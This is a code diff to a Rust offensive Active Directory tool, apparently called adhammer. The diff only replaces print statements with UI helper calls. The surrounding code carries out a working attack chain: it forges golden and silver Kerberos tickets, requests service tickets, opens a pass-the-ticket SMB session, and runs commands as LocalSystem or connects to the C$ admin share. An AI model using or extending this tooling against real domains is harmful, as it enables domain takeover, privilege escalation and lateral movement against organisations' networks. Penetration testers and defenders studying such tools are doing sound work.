@@ -122,9 +122,11 @@ async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> 
             let key = crate::parse_forge_key(k, a.rc4)?;
             let kdc = a.kdc.clone().unwrap_or_else(|| a.host.clone());
             let tgt = adhammer_kerberos::forge_golden_tgt(&id, &a.realm, &key, a.rc4)?;
-            println!("[+] forged golden TGT for {}@{}", a.user, a.realm);
+            ui::ok(&format!("forged golden TGT for {}@{}", a.user, a.realm));
             let st = adhammer_kerberos::get_service_ticket(&tgt, &spn, &kdc).await?;
-            println!("[+] got service ticket for {spn} (KDC accepted the golden TGT)");
+            ui::ok(&format!(
+                "got service ticket for {spn} (KDC accepted the golden TGT)"
+            ));
             checklist.record_ok(
                 "build service ticket (golden→TGS-REQ or silver forge)",
                 format!("golden → KDC accepted, TGS for {spn}"),
@@ -134,7 +136,7 @@ async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> 
         (None, Some(k)) => {
             let key = crate::parse_forge_key(k, a.rc4)?;
             let tgt = adhammer_kerberos::forge_silver_tgt(&id, &a.realm, &key, &spn, a.rc4)?;
-            println!("[+] forged silver ticket for {spn}");
+            ui::ok(&format!("forged silver ticket for {spn}"));
             let st = adhammer_kerberos::silver_service_ticket(&tgt, &spn);
             checklist.record_ok(
                 "build service ticket (golden→TGS-REQ or silver forge)",
@@ -154,10 +156,10 @@ async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> 
         "SMB Kerberos AP-REQ (login_kerberos)",
         format!("session as {}@{}", a.user, a.realm),
     );
-    println!(
-        "[+] Kerberos SMB session established as {} (pass-the-ticket)",
+    ui::ok(&format!(
+        "Kerberos SMB session established as {} (pass-the-ticket)",
         a.user
-    );
+    ));
 
     if let Some(cmd) = &a.command {
         smb.tree_connect(&format!("\\\\{}\\IPC$", a.host)).await?;
@@ -166,13 +168,14 @@ async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> 
             "run command / tree-connect (verify access)",
             format!("service '{}' ran (win32 {})", r.service, r.start_win32),
         );
-        println!(
-            "[+] ran as LocalSystem (service '{}', win32 {})",
+        ui::ok(&format!(
+            "ran as LocalSystem (service '{}', win32 {})",
             r.service, r.start_win32
-        );
+        ));
         match r.output {
+            // Command output is DATA — keep on stdout for downstream pipes.
             Some(o) if !o.is_empty() => println!("\n{o}"),
-            _ => println!("[*] no output captured"),
+            _ => ui::info("no output captured"),
         }
     } else {
         smb.tree_connect(&format!("\\\\{}\\C$", a.host)).await?;
@@ -180,10 +183,10 @@ async fn pth_impl(a: PthArgs, checklist: &mut ui::StageChecklist) -> Result<()> 
             "run command / tree-connect (verify access)",
             format!("\\\\{}\\C$ tree-connected", a.host),
         );
-        println!(
-            "[+] tree-connected \\\\{}\\C$ — authenticated access confirmed",
+        ui::ok(&format!(
+            "tree-connected \\\\{}\\C$ — authenticated access confirmed",
             a.host
-        );
+        ));
     }
     Ok(())
 }
